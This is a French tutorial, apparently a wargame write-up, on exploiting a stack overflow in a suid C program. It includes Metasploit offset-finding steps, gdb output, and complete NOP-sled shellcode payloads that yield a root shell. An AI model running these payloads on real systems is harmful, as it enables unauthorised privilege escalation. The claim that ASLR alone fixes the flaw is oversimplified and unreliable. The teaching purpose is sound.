# Le Stack Overflow

## I. Introduction
Le Stack Overflow consiste à utiliser une faille applicative pour écrire en mémoire et détourner le flow du programme. Nous allons par exemple tenter ici de faire executer un shell root à un programme suid lambda.

## II. Pré-requis
* Un programme suid
* Un code permettant le buffer overflow

Soit le programme `vuln` suivant :
```{r, engine='C'}
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void copy(char *arg)
{
	char msg[256];
	strcpy(msg,arg);
    printf("Votre argument est : %s\n",msg);
}

int main(int argc, char **argv)
{
	copy(argv[1]);
	return 0;
}
```

## III. La faille
Ce programme permet le Stack Overflow puisque l'input utilisateur n'est controlé à aucun moment et que `strcpy()` se contente de copier bêtement l'input dans la variable `msg`. Ainsi on peut écrire dans la mémoire.  
L'idée va être d'écraser l'adresse de retour du programme vulnérable par l'adresse de notre shellcode.

## IV. Exploitation

### On détermine l'offset de l'adresse de retour
Pour cela, on génère on suite de caractère unique sur kali :
```{r, engine='bash'}
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```
On execute notre programme vulnérable sous le debugger `gdb`
```{r, engine='bash'}
aas@ubuntu:~$ gdb -q ./vuln
Reading symbols from /wargame/medium/level1/level...(no debugging symbols found)...done.
gdb$ r $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9'")
Votre argument est : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Program received signal SIGSEGV, Segmentation fault.
Cannot access memory at address 0x6a413969
0x6a413969 in ?? ()
```
Kali va maintenant nous dire à l'octet près là où nous pouvons réécrire l'adresse de retour
```{r, engine='bash'}
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb $(ruby -e 'print "\x6a\x41\x39\x69".reverse')
[*] Exact match at offset 268
```
Sans cette technique, il aurait fallu procéder par dicotomie jusqu'à tomber sur le bon offset.

### Détournement du programme
Plusieurs solutions existent ici, nous verrons les deux plus simples : exploitation à l'aide de l'environnement, et exploitation directe (ce sont des termes maison hein :p)

#### 1. A l'aide de l'environnement
Nous commençons par stocker notre shellcode précédé d'une floppé de NOP afin de se laisser une marge :

```{r, engine='bash'}
aas@ubuntu:~$ export SC=$(python -c "print '\x90'*100+'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'")
```

Nous récupérons l'adresse de notre variable SC grâce au programme suivant :

```{r, engine='bash'}
#include <stdio.h>
aas@ubuntu:~$ cat get_env
void main()
{
        printf("ad: 0x%lx\n", getenv("SC"));
}
aas@ubuntu:~$ ./get_env
ad: 0xbffffed3
```
Nous devons donc écraser l'adresse de retour avec l'adresse de notre variable SC : 0xbffffed3
```{r, engine='bash'}
aas@ubuntu:~$ ./vuln $(python -c "print 'A'*268 + '\xd3\xfe\xff\xbf'")
# whoami
root
```

#### 2. Par exploitation directe
Lorsque le buffer est assez grand, nous pouvons tout faire rentrer et l'utilisation de l'environnement n'est pas nécéssaire.  
Le principe est toujours d'écraser l'adresse de retour pour la faire pointer dans nos NOP. Il faut donc récupérer une des adresses pointant sur nos NOP.
```{r, engine='bash'}
aas@ubuntu:~$ gdb -q ./vuln
Reading symbols from /wargame/medium/level1/level...(no debugging symbols found)...done.
gdb$ r $(python -c "print 'A'*184 + '\x90'*50 + '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80' + 'AAAA'")
0xbffffec0:	0x2d465455	0x494c0038	0x3d53454e	0x53003133
0xbffffed0:	0x90903d43	0x90909090	0x90909090	0x90909090
0xbffffee0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffef0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffff00:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffff10:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffff20:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffff30:	0x90909090	0x316a9090	0x80cd9958	0xc189c389
0xbfffff40:	0xcd58466a	0x520bb080	0x732f6e68	0x2f2f6868
0xbfffff50:	0xe3896962	0x80cdd189	0x53494800	0x4e4f4354
0xbfffff60:	0x4c4f5254	0x6e67693d	0x6265726f	0x0068746f
0xbfffff70:	0x454d4f48	0x61772f3d	0x6d616772	0x656d2f65
```
On voit nos NOP (\x90). Il suffit de choisir une adresse d'un NOP au milieu de la floppé pour se laisser de la marge. Disons l'adresse `0xbfffff10`. Il nous suffit maintenant de remplacer les AAAA par cette adresse et le tour est joué.
```{r, engine='bash'}
aas@ubuntu:~$ ./vuln $(python -c "print 'A'*184 + '\x90'*50 + '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80' + '\x10\xff\xff\xbf'")
# whoami
root
```

## V. Sécurisation
Aujourd'hui, les kernels sont patchés contre ce problème. L'ASLR palie à ce problème.
